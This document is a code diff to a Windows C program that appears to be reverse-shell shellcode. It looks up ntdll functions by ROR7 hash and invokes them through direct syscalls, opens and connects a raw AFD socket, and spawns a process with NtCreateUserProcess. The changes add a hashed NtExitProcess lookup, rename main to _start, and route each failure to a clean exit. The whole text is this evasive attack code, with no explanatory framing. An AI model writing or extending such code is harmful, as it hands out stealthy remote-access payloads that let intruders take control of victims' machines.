@@ -29,6 +29,7 @@
 #define ROR7_32__NtCreateFile                   0x4489294C
 #define ROR7_32__NtDeviceIoControlFile          0x7FB40DDF
 #define ROR7_32__NtCreateUserProcess            0x0C43BACB
+#define ROR7_32__NtExitProcess                  0x618D8E8F
 #define ROR7_32__RtlInitUnicodeString           0x05D93FE7
 #define ROR7_32__RtlCreateProcessParametersEx   0x90E3A882
 
@@ -46,6 +47,10 @@ VOID INIT_NTDLL_API() {
         GET_NTDLL_FUN(
                 ROR7_32__NtDeviceIoControlFile, 
                 &gNtdllApi.NtDeviceIoControlFile
+        );
+        GET_NTDLL_FUN(
+                ROR7_32__NtExitProcess, 
+                &gNtdllApi.NtExitProcess
         );
         GET_NTDLL_FUN(
                 ROR7_32__RtlInitUnicodeString, 
@@ -70,7 +75,7 @@ VOID INIT_NTDLL_API() {
 // being called. This stack space is used to save
 // any arguments that as may need be.
 
-VOID main() {
+VOID _start() {
         INIT_NTDLL_API();
 
         // Creating a socket requires requesting a file
@@ -136,7 +141,7 @@ VOID main() {
                 &AfdOpenPacketEa,
                 sizeof(AfdOpenPacketEa)
         )))
-                return;
+                goto END;
         
         // NtDeviceIoControlFile requires 10 parameters.
         // A bind must come before a connection.
@@ -174,7 +179,7 @@ VOID main() {
                 &OutputBuffer,
                 sizeof(OutputBuffer)
         )))
-                return;
+                goto END;
 
         // Connecting.
         //
@@ -212,7 +217,7 @@ VOID main() {
                 &OutputBuffer,
                 sizeof(OutputBuffer)
         )))
-                return;
+                goto END;
 
         // NtCreateUserProcess requires 11 parameters. This
         // is the most bare-bones that I have gotten to work.
@@ -287,6 +292,14 @@ VOID main() {
                 pUserProcessParameters,
                 &PsCreateInfo,
                 &AttributeList
+        )))
+                goto END;
+
+END:
+        SET_SYSCALL(gNtdllApi.NtExitProcess);
+        if (!NT_SUCCESS(RUN_SYSCALL(
+                ZERO,
+                ZERO
         )))
                 return;
 }
